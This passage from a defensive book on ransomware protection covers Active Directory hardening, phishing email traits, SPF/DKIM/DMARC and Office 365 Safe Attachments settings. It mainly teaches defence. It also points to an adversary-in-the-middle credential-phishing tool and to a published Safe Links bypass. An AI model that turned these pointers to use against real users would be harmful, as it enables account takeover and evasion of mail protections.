    that vulnerability has now been fixed, there might be new vulnerabilities that
    appear later with the same severity, so ensure that all security updates are installed
    on your domain controllers.


    +   - Ensure the LDAP server signing requirements are set to require signing.
    This will ensure that attackers cannot use privilege escalation tools such as
    KrbRelayUp. This is described in more detail by Microsoft at https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/domain-controller-ldap-server-signing-requirements.


    Additionally, if you have the licenses, consider implementing Microsoft Defender
    for Identity, which provides a cloud-based security service to monitor Active
    Directory. This service looks at both events and network traffic to detect abnormal
    user behavior or machine traffic aimed at domain controllers.'
  merge: -1
  img_proc: true
- pgno: 148
  md: 'It does this by using a lightweight agent that is installed on your domain
    controllers and monitors all network traffic and events that are generated there.
    Here, you can also find a list of the different built-in detection mechanisms
    and alert rules that are available: https://learn.microsoft.com/en-us/defender-for-identity/alerts-overview.


    The great thing about Defender for Identity is that it has the ability to detect
    attacks such as the golden ticket, silver ticket, pass the hash, pass the ticket,
    and Kerberoasting.


    # Securing email services


    Now, we have looked more at other miscellaneous countermeasures and what we can
    do for our Active Directory domain. The final aspect, and what might be the biggest
    attack vector for ransomware, is email.


    In this book, we will focus on securing email related to Microsoft Office 365,
    although many of the techniques and features discussed here are also applicable
    to other email providers.


    According to information from Statista, close to 3% of employees stated that they
    clicked on links that were sent in phishing emails: https://www.statista.com/topics/8385/phishing/#dossierContents__outerWrapper.


    While 3% is not a high number, an attacker only needs one employee that leaks
    their account information to initiate a ransomware attack or to run malicious
    content on their machine.


    Another attack vector we are seeing more of is the use of Adversary-in-the-Middle
    (AiTM) phishing. AiTM phishing is a method used by attackers to gain unauthorized
    access to a user’s account by intercepting their login session, capturing their
    password and session cookie, and impersonating the user. Once the attacker has
    obtained the user’s credentials, they can access the user’s mailbox and launch
    Business Email Compromise (BEC) attacks against other targets.


    An example of this is the use of evilginx, which is an adversary-in-the-middle
    component used for collecting login credentials and session cookies. You can find
    it at https://github.com/kgretzky/evilginx2.


    Microsoft 365 Defender can detect suspicious activities associated with AiTM phishing
    attacks and their subsequent actions, such as session cookie theft and attempts
    to access Exchange Online using stolen cookies. To enhance the level of security
    against similar attacks, organizations should also implement Conditional Access
    policies in addition to MFA. These policies can evaluate sign-in requests using
    additional identity-related factors such as user or group membership, IP location,
    and device status.


    Now, when looking at phishing emails, we can see that most phishing emails use
    the same basic structure using either one or multiple properties:


    +   - **Request for personal information over emails** – Such as asking for username/password
    or other sensitive information.'
  merge: -1
  img_proc: true
- pgno: 149
  md: '+   - **States an important level of urgency** – Mentioning that the user needs
    to take urgent action such as ensuring that their account will not get locked.

    +   - **Links within the email that redirect you to unfamiliar websites and domains**
    – While they might be redirected to a website that might look familiar, the URL
    is from a different domain.

    +   - **Unsolicited attachments** – These might be executables or Word documents
    that contain malicious payload to initialize the malware bootloader.

    +   - **Changes in email addresses** – Either the email is not official or contains
    smaller changes compared to the official domain name. These might be minor changes
    such as Microso tt.com instead of Microsoft.com.

    +   - **Spelling or grammar mistakes** (especially if they are forged in your
    native language) – There are many cases where attackers use generic text and then
    use Google Translate to translate the email for different recipients within different
    countries.


    Over the last few years, attackers have also become better at crafting emails
    that appear to come from the same domain name. This can be done by spoofing the
    sender’s address. Alternatively, they are using known URLs to send malicious content
    such as Microsoft OneDrive or known services such as Dropbox or Google drive.
    In addition, you also have more targeted phishing attacks, also known as spear
    phishing, where the attackers send specialized phishing emails to specific users
    or organizations.


    Once I was working with a customer who was attacked with a spear-phishing attack
    where the CFO was compromised. This customer was running Office 365, so the attacker
    had predefined scripts that were used for collecting and downloading all emails
    from their account and then added an auto-forward script to forward all emails
    to an external address.


    After a couple of weeks of gaining access, the attacker had good knowledge about
    the CFO and how they interacted with other colleagues via email. The attacker
    then used that information to create a new email with a malicious payload that
    was sent to the finance controller who ran the malicious payload on their machine.
    This started a ransomware attack on their infrastructure.


    Before we go into the details, I want to cover the overall attack vectors and
    weaknesses we have in email:


    +   - Spoofed emails (more specifically, the MAIL FROM info) or coming from domain
    names that might be like the company domain name.

    +   - Phishing emails from malicious domains. Most of these domains are new and
    used only for phishing campaigns for a brief period.

    +   - Phishing emails sent from known domains such as Office 365 or Gmail.

    +   - Phishing emails containing malicious content or links to malicious URLs.


    Overall, the main goal when it comes to email security is to ensure that we can
    verify the sender, sender domain, body of the email, URLs, and any attachments.'
  merge: -1
  img_proc: true
- pgno: 150
  md: 'One thing we also need to remember is that phishing emails can come from anyone,
    I have seen cases where a vendor or a subcontractor was compromised, and their
    email was used to send out new phishing emails to the organization that I was
    working in.


    However, it is important to understand that while we can implement a lot of security
    mechanisms to try and protect our end users from phishing emails, the most important
    part is continuously educating users on how to spot phishing emails. I have also
    seen a scenario where a partner of the customer was compromised, and the attackers
    then used legitimate email addresses from the partner to contact the customer
    and ask for information. In that scenario, it would be difficult to have any security
    mechanism in place since the domain and content of the email were legitimate.
    Fortunately, the end users themselves understood what had happened.


    Another issue that might occur is if one of our users gets compromised and is
    used to send phishing emails or spam, our email domain might get blocked or blacklisted
    by other email security gateways to protect their customers. This might result
    in future legitimate emails getting blocked by the security vendors until the
    domain gets whitelisted again. However, most vendors provide online reputation
    scans that can be used to verify whether your domain has been blacklisted or not,
    such as the following:


    +   - https://www.barracudacentral.org/lookups/lookup-reputation

    +   - https://talosintelligence.com/reputation_center

    +   - https://check.spamhaus.org/

    +   - https://mxtoolbox.com/


    MXToolbox is probably the most useful since it allows us to also check MX records,
    SPF records, DKIM, and DMARC, too. Additionally, it allows us to inspect email
    headers easily to determine the source of an email.


    # Protecting the domains


    There are three main ingredients that are used to protect an organization from
    forged emails, phishing emails, and spoofed domains. These are Sender Policy Framework
    (SPF), DomainKeys Identified Mail (DKIM), and Domain-Based Message Authentication,
    Reporting, and Conformance (DMARC). These features serve different purposes:


    +   - SPF – This is a mechanism that can be used by an email server when it receives
    an email, to check whether the sender''s e-mail server is allowed to send emails
    on behalf of the specified domain. It works on both the sender side and the recipient
    side. On the sender page, an organization can publish the IP address(es) that
    are authorized to send emails on behalf of the organization''s domain, as a DNS
    entry in the organization''s DNS. The receiving email server can then examine
    the DNS records of the domain that the email was allegedly sent from and verify
    that the IP address of the sending server is there, as an authorized sender.'
  merge: -1
  img_proc: true
- pgno: 151
  md: '+   - **DKIM** – With DKIM, a signature is added, which can confirm that the
    email was sent in a manner authorized by the owner of the sending domain, and
    that the relevant parts of the email have not been changed. Asymmetric encryption
    is used to add a digital signature as a separate header field in the email header.
    The public key used for the signing is then published with the DNS records of
    the sending organization.

    +   - **DMARC** – This is based on SPF and/or DKIM and tells us how the receiver
    should process emails that fail these checks. In addition, the standard offers
    a reporting protocol that enables a greater degree of reporting of failed emails
    for both recipient and sender mail organizations.


    A great tool to verify the different DNS records that are published is MxToolbox.com,
    which allows you to easily scan domains after the SPF, DKIM, and DMARC records
    just by using the search menu. For instance, you can write `spf:Microsoft.com`
    to get the SPF records for Microsoft.


    While I will not go into too much detail about these mechanisms here, this presentation
    from Cisco goes into more detail about the pros/cons and how the features work:
    `https://www.ciscolive.com/c/dam/r/ciscolive/apjc/docs/2019/pdf/BRKSEC-1243.pdf`.


    Regarding Office 365, most of these features are easily implemented, and you can
    read more about the implementation of these features at `https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/use-dmarc-to-validate-email?view=o365-worldwide`.


    You can set up DMARC to receive regular reports from the email servers that get
    an email from your domain. I recommend that you regularly monitor the DMARC reports
    that you get. However, this requires that you have a DMARC reporting service.
    Microsoft does not have its own DMARC reporting service as part of Office 365,
    but it has signed a partnership with Valimail where Office 365 customers get a
    free DMARC reporting service if they sign up to `https://use.valimail.com/ms-dmarc-monitor.html`.


    # Protecting the content and URLs


    In addition to implementing SPF, DMARC, and DKIM in Office 365, Microsoft has
    additional security mechanisms in Exchange Online Protection to protect users
    from phishing attacks.


    These are features such as the following:


    +   - Safe attachments (for Exchange and SharePoint with OneDrive)

    +   - Safe links

    +   - Anti-phishing protection

    +   - Anti-spoofing protection


    In addition, Microsoft recently introduced a new feature called **Zero-hour auto
    purge (ZAP)**, which allows you to retroactively detect and neutralize malicious
    phishing, spam, or malware messages that'
  merge: -1
  img_proc: true
- pgno: 152
  md: 'have already been delivered to Exchange Online users. You can read more about
    the ZAP feature at https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/zero-hour-auto-purge?view=o365-worldwide.


    Let us start by looking at Safe Attachments and Safe Links, which are available
    for organizations that have Office 365 E5 licenses. The Safe Attachments service
    uses a virtual environment to check attachments (using detonation for malicious
    content) in email messages before they are delivered to the end users. This feature
    is enabled automatically for all end users, and if malicious content is found,
    the messages are automatically put into quarantine.


    You also have the same feature for SharePoint, OneDrive, and Teams that can check
    for malicious content in the files uploaded, but this feature is not enabled by
    default. This feature can be enabled using Microsoft PowerShell or using the Safe
    Attachments option in the Microsoft Defender Portal.


    If you''re using Microsoft PowerShell, perform the following steps:


    +   1. Connect to Office 365 using the Exchange Online PowerShell module, as listed
    here: https://docs.microsoft.com/en-us/powershell/exchange/connect-to-exchange-online-powershell?view=exchange-ps.

    +   2. Then, run this PowerShell command to enable Safe Attachments:

    +   3. Users cannot open, copy, or share malicious files that are detected by
    Safe Attachments; however, they can still download files with malicious content.
    You can disable this by typing in the following command:


    ```

    Set-AtpPolicyForO365 -EnableATPForSPTeamsODB $true

    ```


    ```

    Set-SPOTenant -DisallowInfectedFileDownload $true

    ```


    This ensures that users cannot download files that might contain malware or other
    malicious content.


    One feature that should also be used, given that we have the correct licenses,
    is Microsoft Defender for Office. You can find more details about how to implement
    it in the GitHub repository for the book, which you can find here: https://github.com/PacktPublishing/Windows-Ransomware-Detection-and-Protection/tree/main/chapter4.


    # Other countermeasures


    In addition to the resources listed earlier, there are some other additional tips
    when it comes to minimizing the risks from phishing attacks or users accessing
    malicious content:


    +   - By default, Microsoft Teams allows for an open federation, which allows
    any organization to send direct instant messages to another user in another organization.
    Recently, I encountered a case where numerous users got messages from someone
    else in another organization mimicking users from the IT-department.'
  merge: -1
  img_proc: true
- pgno: 153
  md: 'You can read more about the attack and its countermeasures at `https://msandbu.org/phishing-attacks-in-microsoft-teams-and-external-federation/`.


    +   - As SharePoint admin, you can also define synchronization policies to define
    what kind of file attachments users are allowed (or not allowed) to synchronize
    up. Blocking files with a file extension such as `.exe`, `.hta`, `.js`, or `.iso`
    is a good start. You can read more about how to set up this feature at `https://docs.microsoft.com/en-us/onedrive/block-file-types`.


    +   - It should be noted that features such as safe links and safe attachments
    provide security mechanisms for email, Teams, and SharePoint. They can still be
    bypassed, using legitimate URLs such as other OneDrive URLs from Microsoft or
    other Azure-based services, as detailed here: `https://thalpius.com/2022/03/28/microsoft-defender-for-office-365-safe-links-bypass/`.


    So, it is important to note that while these security features mentioned will
    heighten your security, they are not bulletproof.


    # Summary


    In this chapter, we took a closer look at some of the countermeasures for endpoints
    using Endpoint Manager with features such as ASR rules and management of Defender
    and antimalware rules. Additionally, we learned how to ensure that we have an
    up-to-date endpoint and that our browser is updated on a regular basis. Then,
    we went into how we can protect our services using MFA services such as Conditional
    Access and the NPS with Azure MFA service. Lastly, we went into how we can protect
    our email using services such as SPF, DKIM, DMARC, and other mechanisms in Office
    365 such as Safe Attachments.


    As part of an overall security strategy for protecting against ransomware, implementing
    security mechanisms to protect end users and devices will minimize the risk of
    ransomware. However, we still need to have a holistic view of our environment.
    Therefore, it is also important that we implement security mechanisms for our
    virtual infrastructure, too. In the next chapter, we will look more at how to
    implement countermeasures for workloads running in Microsoft Azure.'
  merge: -1
  img_proc: true
